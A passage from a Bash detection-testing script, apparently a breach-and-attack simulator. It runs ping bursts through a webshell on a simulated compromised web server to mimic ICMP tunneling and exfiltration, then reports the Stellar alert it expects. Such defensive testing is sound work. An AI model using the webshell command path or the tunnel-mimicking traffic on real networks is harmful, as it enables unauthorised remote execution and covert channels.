    ICMP_MODE_USED="tunnel-like-session"
    ICMP_PROFILES_RUN="tunnel-like-session"
    ICMP_COMMAND_EXECUTED="tunnel-like-session:session_id=${session_id}"
    chunk_size=25
    chunks=$(( (planned_packets + chunk_size - 1) / chunk_size ))
    remaining="${planned_packets}"
    icmp_tunnel_log_both "ICMP_TUNNEL_PROFILE target=${target} mode=tunnel-like-session session_id=${session_id} payload=${payload} interval_ms=${interval_ms} interval_seconds=${interval_sec} planned_packets=${planned_packets} chunks=${chunks} duration_goal=${duration_goal}s ping_style=${ICMP_PING_STYLE:-unix}"
    log_detection_window_plan "ICMP_Tunnel" "${target}" "${DETECTION_WINDOW_ICMP_WINDOW_SECONDS}" \
        "tunnel_like_session actual_packets>=80 tunnel_like_score>=70 bidirectional>=50%" "${planned_packets}" \
        "burst_ping_c_${chunk_size}_interval_${interval_ms}ms"
    log_detection_window_progress "ICMP_Tunnel" "${target}" "0" "0" "actual_packets>=80" "no"
    t0=$(date +%s)
    for ((c = 1; c <= chunks; c++)); do
        pipeline_stop_requested && break
        [[ "${remaining}" -lt 1 ]] && break
        local chunk_n="${remaining}"
        (( chunk_n > chunk_size )) && chunk_n="${chunk_size}"
        ping_cmd=$(build_icmp_ping_command "${chunk_n}" "${payload}" "${interval_sec}" "${target}")
        icmp_forbid_monolithic_ping_cmd "${ping_cmd}" "${payload}" "${chunk_n}" || continue
        burst_timeout=$(icmp_burst_webshell_timeout_seconds "${chunk_n}" "${interval_ms}")
        expected_dur=$(icmp_burst_profile_expected_duration "${payload}" "${chunk_n}" "${interval_ms}")
        icmp_log_tunnel_burst_command "${c}" "${target}" "${payload}" "${chunk_n}" "${interval_ms}" "${ping_cmd}" "${burst_timeout}"
        parsed_sent=0
        parsed_received=0
        burst_timed_out=false
        stats_trusted=false
        ICMP_BURST_LAST_ID="${c}"
        if [[ "${DRY_RUN}" == true ]]; then
            sent="${chunk_n}"
            replies="${chunk_n}"
            parsed_sent="${sent}"
            parsed_received="${replies}"
            burst_result="success"
            root_cause="dry_run"
            failure_reason="ok"
            http_status="200"
            exit_code=0
            stats_trusted=true
            icmp_log_burst_result_summary "${c}" "${chunk_n}" "${chunk_n}" "${chunk_n}" "0" "${expected_dur}" "0" "dry_run"
        else
            remote_cmd=$(build_icmp_single_burst_remote_script "${ping_cmd}" "${payload}" "${c}" "${target}" "${campaign}" "${chunk_n}" "${interval_ms}")
            out=$(run_webshell_icmp_burst "icmp-tunnel-like-${c}" "${remote_cmd}" "${burst_timeout}" "${target}" "${c}" "${chunk_n}" 2>/dev/null || true)
            icmp_log_profile_executions_from_output "${out}" "${c}"
            read -r parsed_sent parsed_received burst_result <<< "$(parse_icmp_single_burst_result "${out}" "${ping_cmd}" "${payload}")"
            parsed_sent=$(safe_int "${parsed_sent}")
            parsed_received=$(safe_int "${parsed_received}")
            sent="${parsed_sent}"
            replies="${parsed_received}"
            burst_timed_out="${ICMP_BURST_LAST_TIMED_OUT}"
            stats_trusted="${ICMP_BURST_LAST_COMPLETE}"
            http_status="${WEBSHELL_LAST_HTTP_CODE:-000}"
            exit_code=$(safe_int "${WEBSHELL_LAST_EXIT_CODE}")
            stdout_bytes=${#out}
            stdout_preview=$(icmp_sanitize_log_value "$(extract_icmp_burst_echo_text "${out}" | tail -n3)")
            stderr_preview=$(icmp_sanitize_log_value "$(printf '%s' "${out}" | grep -Ei 'error|denied|timeout|invalid|unsupported|not found|command timeout' | tail -n2)")
            root_cause=$(classify_icmp_burst_root_cause "${sent}" "${replies}" "${exit_code}" "${http_status}" "${ping_cmd}" "${stderr_preview}" "${stdout_preview}" \
                "$( [[ "${stats_trusted}" == yes ]] && printf no || printf yes)" "${burst_timed_out}")
            ICMP_LAST_ROOT_CAUSE="${root_cause}"
            failure_reason="${root_cause}"
            [[ "${burst_timed_out}" == true ]] && failure_reason="webshell_timeout"
            [[ "${burst_result}" == success && "${root_cause}" != ok && "${burst_timed_out}" != true ]] && failure_reason="${root_cause}"
            if [[ "${burst_timed_out}" == true || "${stats_trusted}" != yes ]]; then
                burst_result=partial
                [[ "${burst_timed_out}" == true && "${sent}" -eq 0 ]] && burst_result=failed
            fi
            burst_elapsed_ms=$(safe_int "${WEBSHELL_LAST_ELAPSED_MS:-0}")
            (( burst_elapsed_ms == 0 )) && burst_elapsed_ms=$(( $(date +%s) * 1000 ))
            log_icmp_root_cause_analysis "${c}" "${root_cause}" "${ICMP_LAST_PAYLOAD_BYTES:-0}" "${ICMP_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}}" \
                "${burst_timeout}" "${burst_timeout}" "${burst_elapsed_ms}" "${stdout_bytes}" "${stderr_preview}" "${stdout_preview}"
            ICMP_LAST_EXEC_STDOUT_SUMMARY="${stdout_preview}"
            append_icmp_tunnel_remote_tail "${out}" "tunnel-like-${c}"
            log_icmp_burst_diagnostics "${target}" "${ping_cmd}" "${expected_dur}" "${out}"
        fi
        total_burst_attempted=$((total_burst_attempted + chunk_n))
        if [[ "${burst_timed_out}" == true || "${stats_trusted}" != yes ]]; then
            ICMP_TIMEOUT_BURSTS=$((ICMP_TIMEOUT_BURSTS + 1))
            ICMP_PARTIAL_PACKETS_ESTIMATED=$((ICMP_PARTIAL_PACKETS_ESTIMATED + chunk_n))
            if [[ "${burst_result}" == failed ]]; then
                ICMP_FAILED_BURSTS=$((ICMP_FAILED_BURSTS + 1))
            else
                ICMP_FAILED_BURSTS=$((ICMP_FAILED_BURSTS + 1))
            fi
        elif [[ "${burst_result}" == success ]]; then
            total_actual=$((total_actual + parsed_sent))
            total_replies=$((total_replies + parsed_received))
            total_bytes=$((total_bytes + parsed_sent * (payload + 28)))
            ICMP_SUCCESSFUL_BURSTS=$((ICMP_SUCCESSFUL_BURSTS + 1))
        elif [[ "${burst_result}" == partial ]]; then
            if (( parsed_sent > 0 )); then
                total_actual=$((total_actual + parsed_sent))
                total_replies=$((total_replies + parsed_received))
                total_bytes=$((total_bytes + parsed_sent * (payload + 28)))
            else
                ICMP_PARTIAL_PACKETS_ESTIMATED=$((ICMP_PARTIAL_PACKETS_ESTIMATED + chunk_n))
            fi
            ICMP_FAILED_BURSTS=$((ICMP_FAILED_BURSTS + 1))
        else
            ICMP_FAILED_BURSTS=$((ICMP_FAILED_BURSTS + 1))
            ICMP_PARTIAL_PACKETS_ESTIMATED=$((ICMP_PARTIAL_PACKETS_ESTIMATED + chunk_n))
        fi
        local burst_loss=0 burst_dur="${expected_dur}"
        (( parsed_sent > 0 )) && burst_loss=$(( (parsed_sent - parsed_received) * 100 / parsed_sent ))
        icmp_log_burst_result_summary "${c}" "${chunk_n}" "${parsed_sent}" "${parsed_received}" "${burst_loss}" "${burst_dur}" "${exit_code:-0}" "${root_cause:-ok}"
        icmp_log_tunnel_burst_result "${c}" "${target}" "${payload}" "${chunk_n}" "${interval_ms}" "${ping_cmd}" \
            "${exit_code}" "${http_status}" "${stdout_bytes}" "${stdout_preview}" "${stderr_preview}" \
            "${parsed_sent}" "${parsed_received}" "${burst_result}" "${failure_reason}" "${root_cause}"
        icmp_log_tunnel_burst "${target}" "${c}" "${payload}" "${chunk_n}" "${interval_ms}" "${parsed_sent}" "${parsed_received}" "${burst_result}"
        remaining=$((remaining - chunk_n))
        local progress_elapsed=$(( $(date +%s) - t0 ))
        icmp_compute_tunnel_like_score "${total_actual}" "${total_replies}" "${progress_elapsed}" "${payload}" "${payload}" "${interval_ms}"
        log_detection_window_progress "ICMP_Tunnel" "${target}" "${progress_elapsed}" "${total_actual}" "actual_packets>=80" "$([[ "${total_actual}" -ge 80 ]] && printf yes || printf no)"
    done
    t1=$(date +%s)
    elapsed=$((t1 - t0))
    ICMP_TUNNEL_DURATION_ELAPSED="${elapsed}"
    ICMP_SESSION_DURATION="${elapsed}"
    ICMP_PACKETS_ATTEMPTED_PLANNED="${total_burst_attempted}"
    if (( total_actual > 0 )); then
        overall_loss=$(( (total_actual - total_replies) * 100 / total_actual ))
        ICMP_PAYLOAD_SIZE_AVG="${payload}"
    fi
    ICMP_OVERALL_LOSS="${overall_loss}"
    icmp_compute_tunnel_like_score "${total_actual}" "${total_replies}" "${elapsed}" "${payload}" "${payload}" "${interval_ms}"
    _icmp_eval_detection_likelihood "${total_actual}" "${ICMP_PAYLOAD_SIZE_AVG}" "${elapsed}" \
        0 0 "${payload}" dw_likelihood dw_reason
    ICMP_DETECTION_WINDOW_LIKELIHOOD="${dw_likelihood}"
    ICMP_DETECTION_LIKELIHOOD="${dw_likelihood}"
    ICMP_DETECTION_REASON="${dw_reason}"
    apply_icmp_tunnel_stats_to_globals "${total_actual}" "${total_replies}" "${overall_loss}" "${total_bytes}" "${payload}" "tunnel-like-session" "${ICMP_COMMAND_EXECUTED}"
    icmp_resolve_tunnel_like_session_result "${total_actual}" "${total_replies}" "${ICMP_TUNNEL_LIKE_SCORE}" "${dw_likelihood}"
    if icmp_tunnel_window_condition_met "${total_actual}" "${total_replies}" "${ICMP_TUNNEL_LIKE_SCORE}" "${dw_likelihood}"; then
        dw_met=yes
    else
        dw_met=no
    fi
    icmp_emit_burst_aggregation
    log_detection_window_summary "ICMP_Tunnel" "${target}" "${elapsed}" "${total_actual}" \
        "actual_packets>=80 received_packets>=40 tunnel_like_score>=70 bidirectional>=50% detection_likelihood=HIGH timeout_bursts<=1" "${dw_met}" "${dw_likelihood}" \
        "actual_packets=${total_actual} attempted_burst=${total_burst_attempted} planned=${planned_packets} received=${total_replies} partial_estimated=${ICMP_PARTIAL_PACKETS_ESTIMATED} timeout_bursts=${ICMP_TIMEOUT_BURSTS} tunnel_like_score=${ICMP_TUNNEL_LIKE_SCORE} interval_ms=${interval_ms} duration=${elapsed}s result=${ICMP_TUNNEL_FINAL_RESULT:-partial}"
    icmp_emit_mode_summary "ICMP_TUNNEL_SESSION_SUMMARY" "tunnel-like-session"
    printf '%s' "ICMP_TUNNEL_STATS planned_packets=${planned_packets} attempted_packets=${total_burst_attempted} actual_packets=${total_actual} partial_packets_estimated=${ICMP_PARTIAL_PACKETS_ESTIMATED} timeout_bursts=${ICMP_TIMEOUT_BURSTS} successful_bursts=${ICMP_SUCCESSFUL_BURSTS} failed_bursts=${ICMP_FAILED_BURSTS} attempted=${total_actual} total=${total_replies} echo=${total_replies} ttl_exceeded=0 dest_unreachable=0 targets=1 sent=${total_actual} replies=${total_replies} loss_pct=${overall_loss} bytes=${total_bytes} payload=${payload} payload_min=${payload} payload_max=${payload} payload_avg=${payload} baseline=0 large=0 large_payload_ratio=0 duration_seconds=${elapsed} tunnel_like_score=${ICMP_TUNNEL_LIKE_SCORE} interval_ms=${interval_ms} bidirectional_ratio=${ICMP_BIDIRECTIONAL_RATIO} session_id=${session_id} detection_likelihood=${dw_likelihood} detection_reason=${dw_reason} result=${ICMP_TUNNEL_FINAL_RESULT:-partial} cmd=${ICMP_COMMAND_EXECUTED} mode=tunnel-like-session target=${target} campaign=${campaign}\nICMP_TUNNEL_DONE campaign=${campaign}"
}

run_icmp_payload_size_anomaly_simulation() {
    run_icmp_multi_burst_profile "$1" "$2" "payload-size-anomaly"
}

run_icmp_alert_profile_simulation() {
    run_icmp_payload_size_anomaly_simulation "$@"
}

run_icmp_large_payload_burst() {
    run_icmp_multi_burst_profile "$1" "$2" "large-payload-burst"
}

run_icmp_sustained_simulation() {
    run_icmp_multi_burst_profile "$1" "$2" "sustained-large-icmp"
}

run_icmp_mtu_like_anomaly() {
    icmp_tunnel_log_both "mode=mtu-like-anomaly redirected to multi-burst profile (monolithic MTU ping forbidden)"
    run_icmp_multi_burst_profile "$1" "$2" "mtu-like-anomaly"
}

run_icmp_mixed_size_simulation() {
    run_icmp_multi_burst_profile "$1" "$2" "mixed-size-icmp"
}

run_icmp_tunnel_simulation() {
    local mode="" target="" campaign_tag="poc-${CAMPAIGN_ID}" out="" icmp_burst_out=""
    local total=0 echo_cnt=0 ttl_ex=0 dest_un=0 stats_found=0 attempted_pkt=0
    local sent=0 replies=0 loss_pct=0 bytes=0 degraded_reason=""
    ICMP_SKIP_REASON=""
    ICMP_DETECTION_REASON=""
    ICMP_DETECTION_WINDOW_LIKELIHOOD="LOW"
    ICMP_PROFILES_RUN=""
    ICMP_SNAP_COMMITTED=false
    ICMP_FINAL_SUMMARY_EMITTED=false
    ICMP_IMMUTABLE_TARGET=""
    ICMP_FAILURE_CLASS=""
    ICMP_FAILURE_REASON=""
    ICMP_LARGEST_PAYLOAD_SIZE=0
    ICMP_LARGEST_EXPECTED_TOTAL_PACKET_SIZE=0
    ICMP_OVERALL_LOSS=0
    ICMP_PACKETS_PLANNED=80
    ICMP_ECHO_COUNT=0
    ICMP_TIME_EXCEEDED_STYLE_COUNT=0
    ICMP_DEST_UNREACHABLE_STYLE_COUNT=0
    ICMP_TOTAL_PACKETS=0
    ICMP_ESTIMATED_BYTES=0
    mode=$(icmp_tunnel_resolve_mode "${ICMP_TUNNEL_MODE}")
    ICMP_MODE_USED="${mode}"
    resolve_icmp_detection_window_plan "${ICMP_PACKET_COUNT}" >/dev/null
    if [[ "${mode}" == "tunnel-like-session" ]]; then
        local tls_planned=$((ICMP_TUNNEL_DURATION_SECONDS * 1000 / ICMP_TUNNEL_LIKE_INTERVAL_MS))
        (( tls_planned < 40 )) && tls_planned=40
        (( tls_planned > 200 )) && tls_planned=200
        ICMP_PACKETS_PLANNED="${tls_planned}"
        icmp_tunnel_log_both "simulation_start mode=${mode} planned_packets=${tls_planned} payload=${ICMP_TUNNEL_LIKE_PAYLOAD:-512} interval_ms=${ICMP_TUNNEL_LIKE_INTERVAL_MS:-1000} duration_goal=${ICMP_TUNNEL_DURATION_SECONDS:-180}s detection_window=${DETECTION_WINDOW_ICMP_WINDOW_SECONDS}s"
        log_message "OK" "ICMP Tunnel Simulation: mode=${mode} tunnel-like-session (payload=${ICMP_TUNNEL_LIKE_PAYLOAD:-512} interval=${ICMP_TUNNEL_LIKE_INTERVAL_MS:-1000}ms) window=${DETECTION_WINDOW_ICMP_WINDOW_SECONDS}s"
    else
        icmp_plan_burst_parameters >/dev/null
        icmp_tunnel_log_both "simulation_start mode=${mode} planned_large_packets=110 baseline_packets=6 total_packets=${ICMP_PACKETS_PLANNED:-116} payload_range=64,1200-1450 interval=${ICMP_MULTI_BURST_INTERVAL}s multi_burst=yes detection_window=${DETECTION_WINDOW_ICMP_WINDOW_SECONDS}s duration_goal<=${ICMP_MULTI_BURST_TOTAL_SECONDS}s"
        log_message "OK" "ICMP Tunnel Simulation: mode=${mode} multi-burst profile (baseline=64 + large=1200-1450) window=${DETECTION_WINDOW_ICMP_WINDOW_SECONDS}s (Stellar: typical vs anomalous ICMP size in 5m bucket)"
    fi
    if [[ "${DRY_RUN}" == true ]]; then
        target=$(select_icmp_tunnel_target || true)
        [[ -z "${target}" ]] && target="${NETWORK_PREFIX}.10"
        icmp_lock_selected_target "${target}" || true
        ICMP_TARGET_COUNT=1
        ICMP_TARGETS=1
        ICMP_TARGET_REACHABLE=true
        ICMP_WEBSHELL_EXEC_HOST="webshell-host (dry-run)"
        out=$(run_icmp_payload_size_anomaly_simulation "${target}" "${campaign_tag}")
        apply_icmp_tunnel_burst_stats_from_output "${out}" || true
        icmp_tunnel_classify_execution_result "${ICMP_PACKETS_ATTEMPTED:-0}" "${ICMP_REPLIES_RECEIVED:-0}" || true
        ICMP_TUNNEL_STAGE_STATUS="success"
        return 0
    fi
    probe_remote_ping_capability
    ICMP_BINARY_FOUND=$([[ "${HAS_ping:-false}" == true ]] && printf yes || printf no)
    detect_webshell_remote_os
    ICMP_WEBSHELL_EXEC_HOST=$(run_webshell_quick "icmp-src-host" \
        "hostname -I 2>/dev/null | awk '{print \$1}' || hostname 2>/dev/null || echo unknown" 2>/dev/null || true)
    ICMP_WEBSHELL_EXEC_HOST="${ICMP_WEBSHELL_EXEC_HOST//$'\r'/}"
    ICMP_WEBSHELL_EXEC_HOST="${ICMP_WEBSHELL_EXEC_HOST%%$'\n'*}"
    log_message "OK" "ICMP execution path: webshell on ${ICMP_WEBSHELL_EXEC_HOST:-unknown} (compromised web server simulation)"
    if [[ "${HAS_ping:-false}" != true ]]; then
        ICMP_SKIP_REASON="ping command not found"
        ICMP_TUNNEL_STAGE_STATUS="failed"
        ICMP_PROBE_RESULT="command_failed"
        ICMP_FALLBACK_MODE="ping-missing"
        ICMP_FAILURE_CLASS="ping_binary_missing"
        ICMP_FAILURE_REASON="ping executable not found on webshell host"
        ICMP_BINARY_FOUND="no"
        DEGRADED_TELEMETRY=true
        icmp_tunnel_log_both "skip reason=${ICMP_SKIP_REASON}"
        return 1
    fi
    target=$(select_icmp_tunnel_target) || {
        if [[ "${ICMP_TUNNEL_FORCE_TARGET}" == true && -n "${ICMP_TUNNEL_USER_TARGET}" ]]; then
            target=$(poc_extract_ipv4 "${ICMP_TUNNEL_USER_TARGET}")
            icmp_lock_selected_target "${target}" || ICMP_SELECTED_TARGET="${target}"
            ICMP_TARGET_SELECTION_SOURCE="user"
            ICMP_TARGET_SELECTION_DETAIL="force_run after probe failure class=${ICMP_PROBE_FAILURE_CLASS:-unknown} result=${ICMP_PROBE_RESULT:-unknown}"
            ICMP_TARGET_REACHABLE=false
            icmp_tunnel_log_both "ICMP force_run: using --icmp-target ${target} despite probe failure (${ICMP_PROBE_FAILURE_CLASS:-unknown})"
        else
            ICMP_TUNNEL_STAGE_STATUS="failed"
            DEGRADED_TELEMETRY=true
            return 1
        fi
    }
    target=$(poc_extract_ipv4 "${target}")
    if ! icmp_is_valid_ipv4_target "${target}"; then
        ICMP_SKIP_REASON="invalid_selected_target target=${target:-${ICMP_SELECTED_TARGET:-empty}}"
        ICMP_TUNNEL_STAGE_STATUS="failed"
        icmp_tunnel_log_both "ICMP_TARGET_SELECTION_LOGIC_ERROR reason=${ICMP_SKIP_REASON}"
        return 1
    fi
    icmp_lock_selected_target "${target}" || true
    ICMP_TARGET_COUNT=1
    ICMP_TARGETS=1
    icmp_burst_out=$(mktemp)
    case "${mode}" in
        tunnel-like-session|auto) run_icmp_tunnel_auto_fallback_chain "${target}" "${campaign_tag}" > "${icmp_burst_out}" ;;
        payload-size-anomaly|alert-profiles) run_icmp_payload_size_anomaly_simulation "${target}" "${campaign_tag}" > "${icmp_burst_out}" ;;
        large-payload-burst) run_icmp_large_payload_burst "${target}" "${campaign_tag}" > "${icmp_burst_out}" ;;
        sustained-large-icmp) run_icmp_sustained_simulation "${target}" "${campaign_tag}" > "${icmp_burst_out}" ;;
        mtu-like-anomaly) run_icmp_mtu_like_anomaly "${target}" "${campaign_tag}" > "${icmp_burst_out}" ;;
        mixed-size-icmp) run_icmp_mixed_size_simulation "${target}" "${campaign_tag}" > "${icmp_burst_out}" ;;
        *) run_icmp_payload_size_anomaly_simulation "${target}" "${campaign_tag}" > "${icmp_burst_out}" ;;
    esac
    out=$(cat "${icmp_burst_out}" 2>/dev/null || true)
    rm -f "${icmp_burst_out}"
    apply_icmp_tunnel_burst_stats_from_output "${out}" || true
    icmp_tunnel_classify_execution_result "${ICMP_PACKETS_ATTEMPTED:-0}" "${ICMP_REPLIES_RECEIVED:-0}" || true
    state_append "icmp_tunnel_waves.log" "cycle=${CURRENT_CYCLE:-1} mode=${mode} $(printf '%.400s' "${out}")"
    read -r total echo_cnt ttl_ex dest_un _ stats_found attempted_pkt sent replies loss_pct bytes <<< \
        "$(parse_icmp_burst_stats_from_output "${out}" "${ICMP_COMMAND_EXECUTED:-}" "${ICMP_PAYLOAD_SIZE_AVG:-1400}")"
    if [[ "${out}" == *"ICMP_TUNNEL_DONE"* && "${stats_found}" == 1 ]]; then
        :
    elif [[ "${ICMP_PACKETS_ATTEMPTED}" -gt 0 ]]; then
        stats_found=1
    else
        degraded_reason="webshell command execution failed or ICMP_TUNNEL_STATS missing"
        if [[ "${out}" == *"Permission denied"* ]]; then
            ICMP_SKIP_REASON="permission denied"
        elif [[ "${out}" == *"not found"* || "${out}" == *"command not found"* ]]; then
            ICMP_SKIP_REASON="ping command not found"
        elif [[ "${out}" == *"unsupported"* || "${out}" == *"invalid"* ]]; then
            ICMP_SKIP_REASON="unsupported ping option"
        elif [[ -z "${out}" ]]; then
            ICMP_SKIP_REASON="webshell command execution failed"
        else
            ICMP_SKIP_REASON="${degraded_reason}"
        fi
        DEGRADED_TELEMETRY=true
        icmp_tunnel_log_both "skip reason=${ICMP_SKIP_REASON}"
    fi
    if (( ICMP_PACKETS_ATTEMPTED < 1 && sent > 0 )); then
        apply_icmp_tunnel_stats_to_globals "${sent}" "${replies}" "${loss_pct}" "${bytes}" "${ICMP_PAYLOAD_SIZES_USED}" "${mode}" "${ICMP_COMMAND_EXECUTED}"
    fi
    if (( ICMP_PACKETS_ATTEMPTED == 0 )); then
        ICMP_SKIP_REASON="${ICMP_SKIP_REASON:-command_execution_failed}"
        ICMP_TUNNEL_RESULT="command_execution_failed"
        ICMP_FAILURE_CLASS="${ICMP_FAILURE_CLASS:-command_execution_failed}"
        ICMP_FAILURE_REASON="${ICMP_FAILURE_REASON:-${ICMP_SKIP_REASON}}"
    elif (( ICMP_REPLIES_RECEIVED == 0 )); then
        ICMP_SKIP_REASON="${ICMP_SKIP_REASON:-target_unresponsive}"
        ICMP_TUNNEL_RESULT="target_unresponsive"
        ICMP_TUNNEL_FINAL_RESULT="partial"
        ICMP_FAILURE_CLASS="${ICMP_FAILURE_CLASS:-target_unresponsive}"
        ICMP_FAILURE_REASON="${ICMP_FAILURE_REASON:-target did not respond}"
    elif [[ "${mode}" == tunnel-like-session ]]; then
        icmp_resolve_tunnel_like_session_result "${ICMP_PACKETS_ATTEMPTED}" "${ICMP_REPLIES_RECEIVED}" \
            "${ICMP_TUNNEL_LIKE_SCORE:-0}" "${ICMP_DETECTION_LIKELIHOOD:-LOW}"
    elif icmp_is_anomaly_only_mode "${ICMP_MODE_USED:-${mode}}" || [[ "${ICMP_FALLBACK_MODES_ATTEMPTED}" == *payload-size-anomaly* ]]; then
        icmp_resolve_payload_anomaly_result "${ICMP_PACKETS_ATTEMPTED}" "${ICMP_REPLIES_RECEIVED}"
    else
        ICMP_TUNNEL_RESULT="success"
        ICMP_TUNNEL_FINAL_RESULT="success"
    fi
    ICMP_TOTAL_PACKETS="${ICMP_PACKETS_ATTEMPTED}"
    ICMP_ECHO_COUNT="${ICMP_REPLIES_RECEIVED}"
    if (( ICMP_PAYLOAD_SIZE_AVG < 1 && ICMP_PACKETS_ATTEMPTED > 0 )); then
        local fb_payload
        fb_payload=$(icmp_tunnel_clamp_payload_size "${ICMP_TUNNEL_PAYLOAD_SIZE:-1400}")
        ICMP_PAYLOAD_SIZE_AVG="${fb_payload}"
        ICMP_PAYLOAD_SIZE_MIN="${fb_payload}"
        ICMP_PAYLOAD_SIZE_MAX="${fb_payload}"
    fi
    log_message "OK" "ICMP Tunnel Simulation complete: mode=${mode} target=$(icmp_format_log_target "${target}") planned=${ICMP_PACKETS_PLANNED} sent=${ICMP_PACKETS_ATTEMPTED} replies=${ICMP_REPLIES_RECEIVED} loss=${ICMP_PACKET_LOSS}% bytes~=${ICMP_ESTIMATED_BYTES} detection_likelihood=${ICMP_DETECTION_WINDOW_LIKELIHOOD:-LOW}"
    log_message "OK" "Expected Stellar detection: ICMP Based Exfiltration or Tunneling (icmp_tunnel / traffic_icmp_exfiltration / T1048.003)"
    icmp_tunnel_log_both "complete mode=${mode} target=$(icmp_format_log_target "${target}") sent=${ICMP_PACKETS_ATTEMPTED} replies=${ICMP_REPLIES_RECEIVED} bytes=${ICMP_ESTIMATED_BYTES} detection_likelihood=${ICMP_DETECTION_WINDOW_LIKELIHOOD:-LOW}"
    [[ -z "${ICMP_PROBE_RESULT}" && "${ICMP_PROBE_RECEIVED}" -gt 0 ]] && ICMP_PROBE_RESULT="alive"
    return 0
}

write_icmp_tunnel_report() {
    [[ -z "${REPORT_MD}" ]] && return 0
    cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true

## ICMP Tunnel Simulation Summary

| Field | Value |
|---|---|
| Source execution path | webshell |
| Source host role | compromised web server simulation |
| Webshell execution host | ${ICMP_WEBSHELL_EXEC_HOST:-unknown} |
| Target host | ${ICMP_SELECTED_TARGET:-n/a} |
| Target selection source | ${ICMP_TARGET_SELECTION_SOURCE:-unknown} (${ICMP_TARGET_SELECTION_DETAIL:-n/a}) |
| Target reachable | ${ICMP_TARGET_REACHABLE:-unknown} |
| Remote OS / ping style | ${ICMP_REMOTE_OS:-unknown} / ${ICMP_PING_STYLE:-unknown} |
| Selected mode | ${ICMP_MODE_USED:-${ICMP_TUNNEL_MODE}} |
| Profiles run | ${ICMP_PROFILES_RUN:-size-anomaly} |
| Payload sizes used | ${ICMP_PAYLOAD_SIZES_USED:-1300-1450} |
| Payload size avg / min / max | ${ICMP_PAYLOAD_SIZE_AVG:-0} / ${ICMP_PAYLOAD_SIZE_MIN:-0} / ${ICMP_PAYLOAD_SIZE_MAX:-0} |
| Largest payload (-s) | ${ICMP_LARGEST_PAYLOAD_SIZE:-0} (expected total ~${ICMP_LARGEST_EXPECTED_TOTAL_PACKET_SIZE:-0} bytes) |
| Detection likelihood | ${ICMP_DETECTION_LIKELIHOOD:-LOW} |
| Execution result | ${ICMP_TUNNEL_RESULT:-unknown} |
| Packets planned | ${ICMP_PACKETS_PLANNED:-0} |
| Packets sent | ${ICMP_PACKETS_ATTEMPTED:-0} |
| Replies received | ${ICMP_REPLIES_RECEIVED:-0} |
| Packet loss | ${ICMP_OVERALL_LOSS:-${ICMP_PACKET_LOSS:-0}}% |
| Estimated total ICMP bytes | ${ICMP_ESTIMATED_BYTES:-0} |
| Duration (elapsed) | ${ICMP_TUNNEL_DURATION_ELAPSED:-0}s |
| Interval | ${ICMP_TUNNEL_PROFILE_INTERVAL:-1-2}s |
| Command executed | \`${ICMP_COMMAND_EXECUTED:-n/a}\` |
| Skip / failure reason | ${ICMP_SKIP_REASON:-none} |
| Stage status | ${ICMP_TUNNEL_STAGE_STATUS:-skipped} |

### Expected Stellar detection
- **Detection name:** ICMP Based Exfiltration or Tunneling
- **Event name:** \`icmp_tunnel\` / \`traffic_icmp_exfiltration\`
- **Tactic / Technique:** Exfiltration (TA0010) / T1048 — Exfiltration Over Alternative Protocol / T1048.003
- **Severity:** 50 (rule-based traffic anomaly)

### Reason this traffic should be suspicious
- Single-target concentrated ICMP echo traffic from webshell (${ICMP_WEBSHELL_EXEC_HOST:-unknown}) to ${ICMP_SELECTED_TARGET:-internal host} (no multi-target dispersion)
- Per-packet payload size anomaly: random 1300–1450 bytes (avg ${ICMP_PAYLOAD_SIZE_AVG:-0}) vs typical ~32–64 byte ping baseline — Stellar **actual bytes vs typical bytes** in 5-minute window
- ${ICMP_PACKETS_ATTEMPTED:-0} packets at 1–2s interval over ${ICMP_TUNNEL_DURATION_ELAPSED:-0}s (detection likelihood: ${ICMP_DETECTION_LIKELIHOOD:-LOW})
- Bidirectional echo/reply: ${ICMP_PACKETS_ATTEMPTED:-0} sent / ${ICMP_REPLIES_RECEIVED:-0} received (result: ${ICMP_TUNNEL_RESULT:-unknown})
- Web server initiating abnormal large ICMP communication (exfiltration-stage network behavior)

EOF
}

apply_dns_enhanced_stats_to_globals() {
    local attempted="$1" eff_tld="$2" cluster_local="$3" powerapps="$4" suspicious_tld="$5" https_cnt="$6" entropy="$7"
    local a_cnt="$8" txt_cnt="$9" aaaa_cnt="${10}"
    DNS_QUERIES_ATTEMPTED="${attempted}"
    DNS_RESPONSES_RECEIVED="${attempted}"
    DNS_EFFECTIVE_TLD_COUNT="${eff_tld}"
    DNS_CLUSTER_LOCAL_COUNT="${cluster_local}"
    DNS_POWERAPPS_STYLE_COUNT="${powerapps}"
    DNS_SUSPICIOUS_TLD_COUNT="${suspicious_tld}"
    DNS_HTTPS_QUERY_COUNT="${https_cnt}"
    DNS_TOTAL_ENTROPY_STYLE_COUNT="${entropy}"
    DNS_A_QUERIES="${a_cnt}"
    DNS_TXT_QUERIES="${txt_cnt}"
    DNS_AAAA_QUERIES="${aaaa_cnt}"
    DNS_HIGH_ENTROPY_LABELS="${entropy}"
    if (( attempted > 0 )); then
        local detail_sum=$((eff_tld + cluster_local + powerapps + suspicious_tld + https_cnt + entropy))
        if (( detail_sum == 0 )); then
            DEGRADED_TELEMETRY=true
            append_dns_tunnel_wave_log "reason=detail_counters_zero attempted=${attempted}"
        fi
    fi
}

dns_stats_field_from_line() {
    local line="$1" key="$2" token
    for token in ${line}; do
        if [[ "${token}" == "${key}="* ]]; then
            printf '%s' "${token#${key}=}"
            return 0
        fi
    done
}

parse_dns_enhanced_stats_line() {
    local out="$1" line
    local attempted=0 eff_tld=0 cluster_local=0 powerapps=0 suspicious_tld=0 https_cnt=0 entropy=0
    local a_cnt=0 txt_cnt=0 aaaa_cnt=0 cc=0 to=0 top=0 xyz=0 nx_cnt=0
    line=$(printf '%s\n' "${out}" | tr -d '\r' | grep -E 'DNS_ENHANCED_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        attempted=$(safe_int "$(dns_stats_field_from_line "${line}" attempted)")
        eff_tld=$(safe_int "$(dns_stats_field_from_line "${line}" eff_tld)")
        cluster_local=$(safe_int "$(dns_stats_field_from_line "${line}" cluster_local)")
        powerapps=$(safe_int "$(dns_stats_field_from_line "${line}" powerapps)")
        suspicious_tld=$(safe_int "$(dns_stats_field_from_line "${line}" suspicious_tld)")
        https_cnt=$(safe_int "$(dns_stats_field_from_line "${line}" https)")
        entropy=$(safe_int "$(dns_stats_field_from_line "${line}" entropy)")
        aaaa_cnt=$(safe_int "$(dns_stats_field_from_line "${line}" aaaa)")
        a_cnt=$(safe_int "$(dns_stats_field_from_line "${line}" a)")
